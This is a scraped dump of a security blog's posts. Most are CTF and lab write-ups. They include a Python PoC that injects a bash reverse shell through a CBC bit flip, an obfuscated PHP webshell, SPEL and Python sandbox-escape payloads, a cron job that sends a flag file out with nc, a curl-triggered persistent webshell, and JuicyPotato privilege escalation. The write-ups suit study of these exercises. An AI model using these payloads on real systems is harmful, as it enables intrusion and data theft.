(i*nums[0]+nums[1] )%nums[3] == nums[2]%nums[3]: ans=i break r.recvuntil(\u0026quot;x :\u0026quot;) r.sendline(str(ans)) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() # r.interactive() table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF' tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r+=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)+add r=list('BV1 4","tags":null,"title":"WHUCTF 2020 WriteUp","uri":"https://naivekun.com/2020/05/whuctf-2020-wp/","year":"2020"},{"content":" 不要把这篇文章透露给淘宝卖家\n 0x0 前言 闲鱼买了某防火墙，五个千兆口，60包邮\n拆开看了下，是个Marvell的方案，有个pcie，有俩sata，512MB的内存，1G NAND\n于是xjb搜了一波，发现了这个帖子 -\u0026gt; 传送门\n很老了，2015年的帖子，作者给了个dts的patch。试了下发现不行，交换机那部分dts作者没写，只能用他自己做的。于是想自己移植一个玩一下。\n0x1 xjb玩一下 插串口看下U-boot\nu-boot功能还挺全，tftp有关的ip啥的改一下，准备刷机。\n玩了一圈，uboot太老了不支持ubi分区。。。垃圾\n然后进系统看看，后台好丑。。。这里没截图，它不给shell，但是ping功能可以命令注入。。。\n0x2 编译固件 准备固件\n原作者直接改了pogoplug e02的固件，然后交换机部分没写，估计是防淘宝卖家的。\n于是xjb翻翻翻找了找同配置方案，把交换机芯片配置搞了一下\n顺便把分区改了下，后面900多M全给ubifs\n贴下我的patch，也是直接改的pogoplug e02\ndebian@debian-iot:~/seccn/openwrt/target/linux/kirkwood/patches-5.4$ ls\r100-ib62x0.patch 103-iomega-ix2-200.patch 107-01-zyxel-nsa3x0-common-nand-partitions.patch 110-pogo_e02.patch 101-iconnect.patch 105-ea4500.patch 107-03-nsa325.patch 201-enable-sata-port-specific-led-triggers.patch 102-dockstar.patch 106-goflexnet.patch 109-pogoplug_v4.patch 202-linksys-find-active-root.patch debian@debian-iot:~/seccn/openwrt/target/linux/kirkwood/patches-5.4$ cat 110-pogo_e02.patch - model = \u0026quot;Cloud Engines Pogoplug E02\u0026quot;;\r- compatible = \u0026quot;cloudengines,pogoe02\u0026quot;, \u0026quot;marvell,kirkwood-88f6281\u0026quot;,\r- \u0026quot;marvell,kirkwood\u0026quot;;\r-\r- memory {\r- device_type = \u0026quot;memory\u0026quot;;\r- reg = \u0026lt;0x00000000 0x10000000\u0026gt;;\r- };\r+ model = \u0026quot;SECCN AC80WT by naivekun\u0026quot;;\r+ compatible = \u0026quot;cloudengines,pogoe02\u0026quot;, \u0026quot;marvell,kirkwood-88f6281\u0026quot;,\r+ \u0026quot;marvell,kirkwood\u0026quot;;\r+\r+ memory {\r+ device_type = \u0026quot;memory\u0026quot;;\r+ reg = \u0026lt;0x00000000 0x10000000\u0026gt;;\r+ };\r+\r+ chosen {\r+ bootargs = \u0026quot;console=ttyS0,115200n8 earlyprintk\u0026quot;;\r+ };\r+\r+ mbus {\r+ pcie-controller {\r+ status = \u0026quot;okay\u0026quot;;\r+\r+ pcie@1,0 {\r+ status = \u0026quot;okay\u0026quot;;\r+ };\r- chosen {\r- bootargs = \u0026quot;console=ttyS0,115200n8\u0026quot;;\r- stdout-path = \u0026amp;uart0;\r+ };\r+ };\r+ ocp@f1000000 {\r+ pinctrl: pin-controller@10000 {\r+ pmx_usb_power_enable: pmx-usb-power-enable {\r+ marvell,pins = \u0026quot;mpp29\u0026quot;;\r+ marvell,function = \u0026quot;gpio\u0026quot;;\r+ };\r+ pmx_led_green: pmx-led_green {\r+ marvell,pins = \u0026quot;mpp48\u0026quot;;\r+\r+ };\r+\r+ port@5 {\r+ reg = \u0026lt;5\u0026gt;;\r+ label = \u0026quot;cpu\u0026quot;;\r+ ethernet = \u0026lt;\u0026amp;eth0port\u0026gt;;\r+ fixed-link {\r+ speed = \u0026lt;1000\u0026gt;;\r+ full-duplex;\r+ };\r+ };\r+ port@6 {\r+ reg = \u0026lt;6\u0026gt;;\r+ label = \u0026quot;cpu\u0026quot;;\r+ ethernet = \u0026lt;\u0026amp;eth1port\u0026gt;;\r+ fixed-link {\r+ speed = \u0026lt;1000\u0026gt;;\r+ full-duplex;\r+ };\r+ };\r+ };\r+ };\r- ethphy0: ethernet-phy@0 {\r- reg = \u0026lt;0\u0026gt;;\r- };\r};\r\u0026amp;eth0 {\r- status = \u0026quot;okay\u0026quot;;\r+ status = \u0026quot;okay\u0026quot;;\rethernet0-port@0 {\r- phy-handle = \u0026lt;\u0026amp;ethphy0\u0026gt;;\r+ speed = \u0026lt;1000\u0026gt;;\r+ duplex = \u0026lt;1\u0026gt;;\r+ };\r+};\r+\r+\u0026amp;eth1 {\r+ status = \u0026quot;okay\u0026quot;;\r+ ethernet1-port@0 {\r+ speed = \u0026lt;1000\u0026gt;;\r+ duplex = \u0026lt;1\u0026gt;;\r};\r};\r 然后改几个地方\n0x2.1 Makefile 加上ubifs打包的参数\n FEATURES加个ubifs MKUBIFS_OPTS和UBIFS_OPTS填一下，后面那些试出来的，写炸了会kernel panic  0x2.2 make menuconfig 改下target，选那个魔改的pogoplug\n文件系统选上ubifs\n0x2.3 board.d 改这个文件\n~/seccn/openwrt/target/linux/kirkwood/base-files/etc/board.d/02_network\r pogoplug那里改下默认配置\n 好了，选上常用的包，wireguard，pppoe，nat6啥的，make即可\nmake的时候建议挂上代理，要下很多东西\nmake完会生成这些东西\n这里只需要上图的openwrt-kirkwood-cloudengines_pogoe02-ubifs-sysupgrade.bin\n和下图的root.ubifs\n0x3 来点骚操作 默认配置用的squashfs和overlay，不知道为啥挂不上。。。而且一个nand设备，用ubifs更清真\n所以设法让这个东西跑在ubifs上\n前文提到了u-boot不支持ubi，但是又不敢自己做u-boot。。。刷炸了就gg了，nand编程器好几百\n于是这么搞\n0x3.1 kernel 找到前文提到的openwrt-kirkwood-cloudengines_pogoe02-ubifs-sysupgrade.bin，解压缩，有个名字是kernel的文件，把他拿出来。\n这个就是内核。它源码有bug，uboot给他的bootargs里mtdparts无效。。。。懒得修，不影响用\n0x3.2 ubi 接下来制作ubifs文件系统\n找到前文提到的root.ubifs\n注意这个东西不能直接塞进去用，它是ubifs，要刷进去的是ubi分区\n于是找到了这个工具 -\u0026gt; ubinize\n用它把ubifs做成ubi分区\n写个配置文件\n然后打包\nubinize seccn.ini -p 128KiB -m 2048 -s 512 -o seccn.ubi.img\r 0x4 刷进去 插上网线插上串口，开机进uboot\n如图先把kernel刷进去\n然后刷文件系统\n后面还有一行nand write 0x02000000 0x00900000 0x5e0000\n自己编译出来文件系统的话，改下最后一个大小\n偏移看好别写错。。。uboot写没了就凉了\n最后改下bootargs\n就搞完了\n0x5 end 开机正常跑过kernel，挂载ubi，进系统就没问题了，出现玄学就把报错塞google里面\n随便玩了一下，挺快的，果然防火墙就是牛逼，比那些路由器不知道好到哪里去了\n网卡和交换机+VLAN都OK\nsata口和pcie也没问题，后续找个万兆卡接上去。板子后面那个6pin接口就是给sata用的，顺时针两个gnd两个5v两个12v\n后续用它做个轻nas+软路由也行，查了下好多商用nas就是用的同款cpu\n要固件的给我发邮件\n","id":9,"section":"posts","summary":"不要把这篇文章透露给淘宝卖家 0x0 前言 闲鱼买了某防火墙，五个千兆口，60包邮 拆开看了下，是个Marvell的方案，有个pcie，有俩sata，5","tags":null,"title":"魔改某防火墙，移植Openwrt","uri":"https://naivekun.com/2020/05/hack-on-firewall-seccn-ac80wt/","year":"2020"},{"content":"今天密码学实验用到sagemath\nTMD 垃圾Jupyter notebook真难用\n没有vi，没有补全，没有debug\n受不了受不了，把他搞进VSCode\nVSCode插件 下个code runner\n然后在VSCode的settings.json里面加入以下代码\n\u0026quot;code-runner.executorMapByFileExtension\u0026quot;: {\r\u0026quot;.sagepy\u0026quot;: \u0026quot;\\\u0026quot;C:\\\\Users\\\\\u0026lt;USERNAME-CHANGE-ME\u0026gt;\\\\AppData\\\\Local\\\\SageMath 9.0\\\\runtime\\\\bin\\\\bash.exe\\\u0026quot; --login -c '/opt/sagemath-9.0/sage $fullFileName'\u0026quot;,\r\u0026quot;.py\u0026quot;: \u0026quot;python\u0026quot;\r},\r\u0026quot;code-runner.executorMap\u0026quot;: {\r\u0026quot;python\u0026quot;: null\r},\r\u0026quot;files.associations\u0026quot;: {\r\u0026quot;*.sagepy\u0026quot;: \u0026quot;python\u0026quot;\r}\r 解释一下，通过executorMapByFileExtension把.sagepy后缀定义一个启动命令\n通过files.associations配置.sagepy文件支持高亮\n因为files.associations会导致code-runner自带的executorMap把python映射到预置的python命令(executorMap优先级比executorMapByFileExtension高)\n所以把executorMap的python项写成null，再手动指定executorMapByFileExtension的.py后缀\n哦对了powershell会爆炸。。。shell改成cmd或者自己改一下命令\nSage Math 啥都不用配，装好了之后找他它bash.exe，把上面的配置文件改对就行了\n效果 test.sagepy\n按下Ctrl+Alt+n\n爽到\n","id":10,"section":"posts","summary":"今天密码学实验用到sagemath TMD 垃圾Jupyter notebook真难用 没有vi，没有补全，没有debug 受不了受不了，把他搞进VSCo","tags":null,"title":"配置vscode在terminal中一键运行sagemath py文件","uri":"https://naivekun.com/2020/05/sagemath-vscode-window/","year":"2020"},{"content":"calc 一个计算器，玩了一下看到是SPEL表达式注入\n过滤了# T(\n那就花式反射呗\n''.class -\u0026gt; java.lang.String ''.class.class -\u0026gt; java.lang.Class\n拿到class了就forName\n''.class.class.forName(\u0026quot;java.util.Arrays\u0026quot;)\n然后xjb 去invoke newInstance就是没法往构造参数里传参\n然后xjb google一通发现这个类\n''.class.class.forName('org.springframework.util.ResourceUtils').getFile('/')\n然后读flag就行了\n''.class.class.forName('java.nio.file.Files').readAllLines(''.class.class.forName('org.springframework.util.ResourceUtils').getFile('/').listFiles()[21])\r mc_joinin 一个魔改的mc服务端，大概是我要连上它\n看了下协议实现，不想写\u0026hellip;\n抓包看了一下，服务端发来的protocol_version是997\n那就魔改本地客户端就行了\n题目说它是魔改的1.12服务端，那先下个1.12客户端下来，查了一下1.12的协议版本号是335\nPatch 1 这里下面1.12是版本号，可能这个类是个CommonInfo啥的，把那个335改成997\nPatch2 另外还有一些new mc()的地方，335后面那个参数是服务器地址，有可能那个mc类就是ConnectionImpl之类的，335全改成997\n然后跑起来就能加入游戏\n抓到点东西\n访问过去是个图片，stegsolve瞎几把搞一下，完事\nHard_Pentest_1 有个上传\n老套路了\n\u0026lt;?= $_[]++ ?\u0026gt;\r\u0026lt;?= $_[]=$_._ ?\u0026gt;\r\u0026lt;?= $__________=+_ ?\u0026gt;\r\u0026lt;?= $_=$_[++$__________][+_] ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= $__=++$_ ?\u0026gt;\r\u0026lt;?= $___=++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= ++$_ ?\u0026gt;\r\u0026lt;?= $____=++$_ ?\u0026gt;\r\u0026lt;?= $_____=++$_ ?\u0026gt; \u0026lt;?= $______=${_.$___.$__.$____.$_____} ?\u0026gt;\r\u0026lt;?= $______[+_]($______[$__________]) ?\u0026gt;\r 后缀大写PHP绕过\nGet shell之后找不到flag 扫内网，有个域控192.168.0.12 smb看一下，有个共享Hint和SYSVOL 从SYSVOL里提取GPP得到用户和密码\nUserNames : {HintZip_Pass}\rNewName : [BLANK]\rPasswords : {zL1PpP@sSwO3d}\r Hint里面有个压缩包，用上面的密码打开就得到flag\n","id":11,"section":"posts","summary":"calc 一个计算器，玩了一下看到是SPEL表达式注入 过滤了# T( 那就花式反射呗 ''.class -\u0026gt; java.lang.String ''.class.class -\u0026gt; java.lang.Class 拿到class了就forName ''.class.class.forName(\u0026quot;java.util.Arrays\u0026quot;) 然后xjb 去invoke","tags":null,"title":"De1CTF 2020 部分WP","uri":"https://naivekun.com/2020/05/de1ctf2020-wp/","year":"2020"},{"content":"迁移博客 受不了node啦\n换Hugo\n硬件 回不了学校。。。临时搞了套nas\n前一段矿难，有一批矿机被便宜挂到某鱼了\n底板9个PCI-E，其中最右边那个插块cpu卡，其他8个显卡\n右边那个CPU卡实测可以单板开机，配置还不错，比普通ITX主板便宜多了\n于是买了两块，魔改了下供电\n左边那个是3215U，右边是A6-3420m，都是千兆口，两块板一共花了180，顺便搞了个矿难路由器，30包邮\n于是把Nextcloud Gitea 某ray 等等服务全部丢上去\ngitea + drone server 没啥计算负载的丢到左边那块板子上\nversion: '3'\rservices:\rgitea:\rimage: gitea/gitea\rcontainer_name: gitea\rrestart: always\rvolumes:\r- ./gitea:/data\r- /etc/timezone:/etc/timezone:ro\r- /etc/localtime:/etc/localtime:ro\rextra_hosts:\r- \u0026quot;drone.naivekun.home:192.168.2.233\u0026quot;\rnetworks:\rdefault:\rexternal:\rname: docker-br\r version: '3'\rservices:\rdrone:\rimage: drone/drone:1\rcontainer_name: drone\rvolumes:\r- ./drone:/data\r- /etc/localtime:/etc/localtime\renvironment:\r- DRONE_SERVER_HOST=drone.naivekun.home\r- DRONE_SERVER_PROTO=http\r- DRONE_GIT_ALWAYS_AUTH=true\r- DRONE_RPC_SECRET=\u0026lt;REDACTED\u0026gt;\r- DRONE_GITEA_SERVER=http://git.naivekun.home\r- DRONE_GITEA_CLIENT_ID=\u0026lt;REDACTED\u0026gt;\r- DRONE_GITEA_CLIENT_SECRET=\u0026lt;REDACTED\u0026gt;\rrestart: always\rextra_hosts:\r- \u0026quot;git.naivekun.home:192.168.2.233\u0026quot;\r- \u0026quot;drone.naivekun.home:192.168.2.233\u0026quot;\rnetworks:\rdefault:\rexternal:\rname: docker-br\r 参考文档随便配配就行了\ndrone runner runner支持很多种，包括SSH DigitalOcean Docker等等，这里用Docker，每次Build的时候会开个docker跑东西\nversion: '3'\rservices:\rdrone_runner:\rimage: drone/drone-runner-docker:1\rcontainer_name: drone_runner\renvironment:\r- DRONE_LOGS_DEBUG=true\r- DRONE_RPC_HOST=drone.naivekun.home\r- DRONE_RPC_PROTO=http\r- DRONE_RPC_SECRET=\u0026lt;REDACTED\u0026gt;\r- DRONE_RUNNER_NAME=drone_runner\rvolumes:\r- /var/run/docker.sock:/var/run/docker.sock\r- /etc/localtime:/etc/localtime\rrestart: always\rnetworks:\rdefault:\rexternal:\rname: docker-br\r 然后全部up，环境就配完了\n写pipeline .drone.yml用来配置CI的动作\nkind: pipeline\rtype: docker\rname: default\rplatform:\ros: linux\rarch: amd64\rsteps:\r- name: build\rimage: plugins/hugo\rsettings:\rpull: never\rurl: https://naivekun.com\rvalidate: true\r- name: publish\rimage: plugins/gh-pages\rcommands:\r- mkdir ~/.ssh\r- echo -e 'Host github.com\\n HostName github.com\\n StrictHostKeyChecking no\\n IdentityFile /tmp/id_rsa\\n User git\\n' \u0026gt; ~/.ssh/config\r- cp id_rsa /tmp\r- chmod 600 /tmp/id_rsa\r- mv public /tmp\r- rm -rf *\r- rm -rf .git\r- rm -rf .drone.yml\r- rm -rf .gitignore\r- git init\r- git remote add origin git@github.com:naivekun/naivekun.github.io.git\r- mv /tmp/public/* .\r- git add .\r- git commit -m \u0026quot;update blog\u0026quot;\r- git config user.email naiveku0817@gmail.com\r- git config user.name naivekun\r- git push origin HEAD:master --force\r 放个写的很蛇皮的脚本\n那个plugins/gh-pages T M D是坏的！！！没办法自己写commands吧\n为了免密登录Github，可以ssh-keygen一下，把id_rsa.pub导入仓库，仓库根目录放个id_rsa，具体看上面那个脚本\nPUSH! 都配好之后，就很方便辣\n本地仓库写完文章，git push\n触发CI，自动build然后上传到Github Pages\n彩蛋 这玩意就是配的麻烦。。。\n","id":12,"section":"posts","summary":"迁移博客 受不了node啦 换Hugo 硬件 回不了学校。。。临时搞了套nas 前一段矿难，有一批矿机被便宜挂到某鱼了 底板9个PCI-E，其中最右边那","tags":null,"title":"Hugo博客配置Drone CI + Gitea","uri":"https://naivekun.com/2020/04/ci-hugo/","year":"2020"},{"content":"0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver\n出题人用python模拟了一个Kerberos认证的服务。真是日了狗了\n借个图\nKerberos认证分三步\n 从AS拿TGT 用TGT从TGS拿服务票据 拿服务票据去访问服务  读一下源码大概画了个图\nemmmmmm字丑，不重要不重要（\n蓝线是加密。绿线是解密。彩色线是对比\nKDC\nService\n这里有限制，TGS会判断cmd是否是whoami或者ls，然后拿服务账号的master_key加密\n第一种做法 看到这里 而TGT里面没有时间，这个client给的auth是可控的\n所以直接把时间减小，多出的送给某位老人，即可跳过TGS对cmd的限制\n然而我不是这么做的。。。想麻烦了\n第二种做法 当时觉得把字符串用|拼成一块再split很蠢，里面如果某个参数可控，插一个|就让他gg了。\n尝试在user里面插|，但是在TGS那里直接挂逼，它要三个username对的上才行，但是TGT里面那个控制不了，是拿KDC的key加密的。\n然后看了一下它很蛇皮的AES-CBC实现\n？？？发现pad炸了都不报错的？？？\n然后看了下cmdserver的实现\n msg = cryptor.decrypt(base64.b64decode(server_message)).split('|')\rsession_key = msg[0]\rcryptor = AESCipher(session_key)\rusername = cryptor.decrypt(base64.b64decode(authenticator))\rif username == msg[1]:\rprint(\u0026quot;[+] system:\u0026quot;,msg[2])\ros.system(msg[2])\rreturn 'execute success'\r 这个server_message是用服务账号加密的，里面是用|隔开的三个参数，session_key和username和cmd\n然后用session_key去解密客户端发来的另一个参数auth，得到用户名。和上面的第二个用户名对比，ok了就执行命令\n就是上面那个图\n发现session_key长度是32，那么想要靠split来控制cmd,必须要让session_key或者user其中之一插入一个|\n但是前文说了改username过不了TGS那个split，session_key又改不了。\n然后突然想到了那个蛇皮的Padding实现，如果解密出错应该返回一个空字符串，如果让server_msg里面的user也是空字符串，就可以通过用户名验证。\n所以用CBC字节反转，把session_key第31位也变成|\n传入的server_msg解密之后就是这样\n('cmd_server decrypt', '{\\xba`\\xff\\x00)GW\\n\\xd6\\x8fKG\\xe1\\x93\\xaf05fe301bacb7ff2||bash -c \u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/8080 0\u0026gt;\u0026amp;1\u0026quot;|whoami')\r 前16个字节被搞乱了，不过无所谓\n这一大坨乱码去解密auth肯定解不了，然后返回一个空串\n然后user和msg[1]都是空串，真实的user被当成cmd执行了\n然后就日了狗狗狗了（\nPOC\nfrom toolkit import AESCipher\rimport json\rimport time\rimport base64\rimport requests\rusername=\u0026quot;bash -c \\\u0026quot;bash -i \u0026gt;\u0026amp; /dev/tcp/x.x.x.x/8080 0\u0026gt;\u0026amp;1\\\u0026quot;\u0026quot;\rmaster_key=\u0026quot;naivekun123\u0026quot;\rcmd=\u0026quot;whoami\u0026quot;\r#register\rr=requests.post(\u0026quot;http://127.0.0.1:5001/register\u0026quot;,data={\u0026quot;username\u0026quot;:username, \u0026quot;master_key\u0026quot;:master_key})\rprint(\u0026quot;register\u0026quot;,r.text)\rcryptor = AESCipher(master_key)\rauthenticator = cryptor.encrypt(json.dumps({'username':username, 'timestamp': int(time.time())}))\rres = requests.post('http://127.0.0.1:5001/getTGT', data={'username': username, 'authenticator': base64.b64encode(authenticator)})\rprint(\u0026quot;[+] res:\u0026quot;,res.text)\rsession_key, TGT = cryptor.decrypt(base64.b64decode(res.content.decode().split('|')[0])), res.content.decode().split('|')[1]\rprint(session_key, TGT)\rcryptor = AESCipher(session_key)\rauthenticator = cryptor.encrypt(json.dumps({'username': username, 'timestamp': int(time.time())}))\rimport base64\rdata={'username': username, 'cmd': cmd, 'authenticator': base64.b64encode(authenticator), \u0026quot;TGT\u0026quot;:TGT}\rprint(data)\rres = requests.post('http://127.0.0.1:5001/getTicket', data={'username': username, 'cmd': cmd, 'authenticator': base64.b64encode(authenticator), 'TGT': TGT})\rprint(\u0026quot;[+] res\u0026quot;,res.content)\rclient_message, server_message = res.text.split('|')\rsession_key = cryptor.decrypt(base64.b64decode(client_message))\rcryptor = AESCipher(session_key)\rusername='a'\rauthenticator = base64.b64encode(cryptor.encrypt(username))\r# cbc\r# 536ff702b2166e5a\r# a0fb499d7d531d27\r# |naivedog|whoami\rserver_message = base64.b64decode(server_message.encode())\roffset = 15\rprint(\u0026quot;original:\u0026quot;,server_message)\rnew_server_msg = server_message[:offset] + bytes([server_message[offset]^session_key[offset+16]^ord(\u0026quot;|\u0026quot;)])+server_message[offset+1:]\rprint(\u0026quot;post:\u0026quot;,new_server_msg)\rnew_server_msg = base64.b64encode(new_server_msg).decode()\rres = requests.post('http://127.0.0.1:5002/cmd', data={'server_message': new_server_msg, 'authenticator': authenticator})\rprint(res.text)\r ","id":13,"section":"posts","summary":"0x00 dooog 看下源码，给了三个flask搞得server，一个client一个kdc一个cmdserver 出题人用python模拟了一个Kerber","tags":["ctf"],"title":"高校抗疫CTF dooog write up","uri":"https://naivekun.com/2020/03/ctf-202003-dooog/","year":"2020"},{"content":"0 星盟团队的内部awd训练，邀请我们团队参加，然后想着也没什么事情才怪就报名了。\n0x1 日常操作 经常打比赛的师傅们都有事，Web方向就我一个打过awd的。。。累死\n首先拿到ssh 一个简单的blog加一个phpmyadmin 上手打包，备份数据库，加上流量记录\n看了下phpmyadmin是4.8.0，有个lfi 传送门 数据库有个admin密码123456 还有ctf密码ctf\nphpmyadmin登录逻辑不好写。。。提前没准备 于是作大死手工登录一遍加别的用户。。。 然后作大死手工拿一遍flag再说\n然后就凉凉了。。。\n有个马 没 看 见 ！！！ 然后就被写满了不死马\n0x2 苟起来 还有一堆没截图，找不到了\n对于使用特殊文件名的马比如这次的--a.php #a.php等等 直接rm会，rm会把\u0026ndash;a.php这样的文件名当成参数 需要rm -f -- *清除，--表示参数已经结束\n当时好像是这么做的 chmod -R 777 .避免权限问题 rm -rf -- *转义并清掉所有目录 然后只需要对付根目录的不死马\n频繁rm -rf，看ps -uax，把新的进程找到，一般pid都比较大，找ppid，kill掉\n这招不起作用就rm -rf xx.php \u0026amp;\u0026amp; mkdir xx.php删文件然后马上建个文件夹\n搞了半天可算把形势控制住了\n然后灵机一动。。。既然师傅们这么强，赶快学习一波\n0x3 继续苟 把备份的源码复制一份，然后开始骚操作 把所有的php文件全部换成流量记录 check就check吧。。。 emmm先赶快弄脚本打那个back.php\n看log，database.php还有mysql那个load_data读flag 估计要check 随便找个没问题的队复制粘贴纯静态 艹，忙不过来，那个mysql的不管了\n继续看log lfi那个早就修完了(用户删了) mysql那个load_data没空打因为。。。 锅从天上来 九点要去开会（ 艹艹艹\n抱上电脑去研究别的队的马了 挂上脚本 溜\n溜之前先把check过了 找个看起来完好的站，httrack爬一遍纯静态，丢上去 完事\n0x4 没了 emmm就这样苟完了 拿了个第四，就差第三25分，再上一局就第三了（ 太菜了太菜了。。。但是真的忙不过来\n别的师傅的马就不贴了，放点别的 echo -e 'while true\\ndo\\nnc -w 1 xx.xxx.xxx.xx 4444 \u0026lt; /flag \u0026gt;\u0026amp;1\\nsleep 1m\\ndone'\u0026gt; web_init.sh\necho '*/1 * * * * nc -w 1 xx.xxx.xxx.xx 4444 \u0026lt; /flag' \u0026gt; initflag.cron\n后期又把拿到的马的文件名弄出来，搞上流量记录 大概别的师傅的马就是。。。先写个一句话，然后上计划任务getflag+不死马 不死马这样激活 echo '* * * * * [[ -e /var/www/html/.61bdb3c1a3dd2bbf384eb51ce49deb47.php ]]||/bin/cat /tmp/php_sessionAspR \u0026gt; /var/www/html/.61bdb3c1a3dd2bbf384eb51ce49deb47.php;/usr/bin/curl \u0026quot;http://xxxxxxxxxxx:11680/.61bdb3c1a3dd2bbf384eb51ce49deb47.php\u0026quot;' | crontab\n","id":14,"section":"posts","summary":"0 星盟团队的内部awd训练，邀请我们团队参加，然后想着也没什么事情才怪就报名了。 0x1 日常操作 经常打比赛的师傅们都有事，Web方向就我一个打过a","tags":["ctf"],"title":"20190831记一次AWD","uri":"https://naivekun.com/2019/09/a-awd-at-2019-8-31/","year":"2019"},{"content":"咕了几个月。。。\n扫端口，啥都没开 常见套路，SNMP看看 解出md5 Dudecake1!\ngoogle一下ike咋连 然后 ipsec start --nofork即可连接\n另外之前snmpwalk已经得到了打开的端口 21是个ftp，允许匿名登录和上传 80是个iis 目录/upload就是ftp的根 ftp传个asp马，80访问一下就行 得到user.txt 提权 whoami /priv SeImpersonatePrivilege开着 JuicyPotato启动\n https://github.com/ohpe/juicy-potato/\n 辣鸡msf自带的一直失败\n手工弄一下 注意clsid默认的是bits的，主机上没有，换成windows update 拿到system\n闲来无事进桌面看看 另外这个英文版的系统asp大马一直500 因为有defender\u0026hellip;  ike也可以用windows连 但是后面就麻烦了\n","id":15,"section":"posts","summary":"咕了几个月。。。 扫端口，啥都没开 常见套路，SNMP看看 解出md5 Dudecake1! google一下ike咋连 然后 ipsec start --nofork即可连接 另外之前snmp","tags":["HackTheBox"],"title":"[Hackthebox] - Conceal","uri":"https://naivekun.com/2019/06/htb-conceal/","year":"2019"},{"content":"扫端口，开了22和5000 5000是个python写的web 简单看看 首先有个contact.html 公钥这么短，估计之后是要爆破一下 现在没啥用 额，直接把源码拉下来 拿到第一个flag\n注意到有个/json_calc 直接exec??? 注意到__builtins__被设为空 就是python自带的int str eval print以及import都不能用。。。 参考这篇Write up进行沙箱逃逸\n注意用subprocess.check_output的时候有回显，os.system()只返回成功执行与否 最后结果会json一下，枚举模块的时候会报错 空格会爆炸 这个flask程序没有弄wsgi，不能处理url编码 执行命令的时候有空格，只能chr(32)拼接\n所以主要用两个东西：搞到builtin和import os模块\n这样可以调builtins\r{}.__class__.__base__.__subclasses__().pop((('a')*59+('b')).index('b'))()._module.__builtins__.values().pop((('c')*109+('d')).index('d'))('__builtin__').chr(32)\r这样可以import\r{}.__class__.__base__.__subclasses__().pop((('a')*59+('b')).index('b'))()._module.__builtins__.values().pop((('c')*109+('d')).index('d'))('os').system(a)\r 然后玄学拼接一下，下载meterpreter，chmod，执行即可 拿到python用户的shell 在根目录下找到secret.txt，拿到第二个flag /home下有两个用户 basilic用户下有个.encrypted_password 开始有个rsa私钥 找工具爆破 得到明文nevergonnagiveyouup ssh直接登录 拿到basilic用户和第三个flag 准备提权 basilic有sudo权限 /opt下有个calc_test.py 看看源码 我们已经可以控制web程序，那么这就可以以root权限写任意文件\n以下有两个方法 写sudoers，把basilic用户加到sudoers 写passwd，新建一个密码已知，uid=0的用户\n以第一种为例 首先魔改web app 直接return一个sudoers文本 然后sudo，运行calc_test.py 拿到root ","id":16,"section":"posts","summary":"扫端口，开了22和5000 5000是个python写的web 简单看看 首先有个contact.html 公钥这么短，估计之后是要爆破一下 现在没啥","tags":["vulnhub"],"title":"[vulnhub] basilic - Writeup","uri":"https://naivekun.com/2019/03/vulnhub-basilic-wp/","year":"2019"},{"content":"windows骚操作盒子\n扫端口，有个80,443,3389 证书没啥东西 看web 并不是隐写\n扫目录 发现两个 /remote /mvc\n第一个是个web上的powershell，要登录 第二个是个辣鸡cms 有注入 没开xp_cmdshell 不是sa 库里没东西\n可以用smb搞哈希 google一下，使用dirtree 本地开个smbserver windows就会瞎搞，把自己的哈希发过来。。。 丢进hashcat里，得到密码xNnWo6272k7x 登录web那个powershell，注意主机名，拿到user权限\n准备提权 有个unifivideo文件 顺手search一下 大概意思是这个服务在停止的时候，会在自己目录运行taskkill.exe，如果在服务的目录放个名字叫taskkill.exe的马，就会以system权限运行这个马\n然而这是windows server 2016 defender神烦。。。\n两个方法 硬刚defender 用各种玄学免杀工具丢进去运行\n只拿个shell 同目录传个nc，再传个自己写的exe 都可以拿到system权限的shelll\n只不过第一种可以上meterpreter\n准备提权 获取服务名和路径 拿powershell翻注册表即可 把文件丢进去，stop-service即可 顺手拿个远程桌面 ","id":17,"section":"posts","summary":"windows骚操作盒子 扫端口，有个80,443,3389 证书没啥东西 看web 并不是隐写 扫目录 发现两个 /remote /mvc 第一个是个web上的powersh","tags":["vulnhub"],"title":"[hackthebox] Giddy - Writeup","uri":"https://naivekun.com/2019/02/htb-giddy-wp/","year":"2019"},{"content":"玄学waf+注入盒子\n注意到8080是filtered\n先看web checkpromo.php可以POST，image.php可能有SSRF 但是WAF很讨厌 POST内容只要有单引号，就拦掉\n先看SSRF 可以读文件 但是找了一圈没啥用。。。 可以读数据库配置 拿ssrf探测一下localhost的端口 之前被拦的8080可以 而且内容和80一样\n那么可以这样绕WAF src带入一层url编码，SSRF访问8080的checkpromo，把注入的payload再带入一层url编码 类似这样 即可过WAF 写tamper 这里有个非常玄学的问题 \u0026hellip; 请求包太长会卡10秒，然后报408错误 可以这样搞 删掉useragent 删掉referer //sqlmap把level开高会带上 删掉payload后面的几个随机字符。。。 可以通过burpsuite代理一下，然后拿正则把这些东西弄掉 这里卡了超级久\u0026hellip;\n以下是完整的sqlmap指令 sqlmap -u \u0026quot;http://192.168.20.192/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=PENTEST123*\u0026quot; --tamper=demo --dbms=mysql --technique=B -D fancydb -T users --proxy=http://127.0.0.1:8080 --dump --no-cast 结果 拿这账号密码登录ssh 进去是个rbash 没有回显。。。 wget下个meterpreter，找个gtfobins运行即可 这里不能直接跑/tmp/111 换成awk 'BEGIN 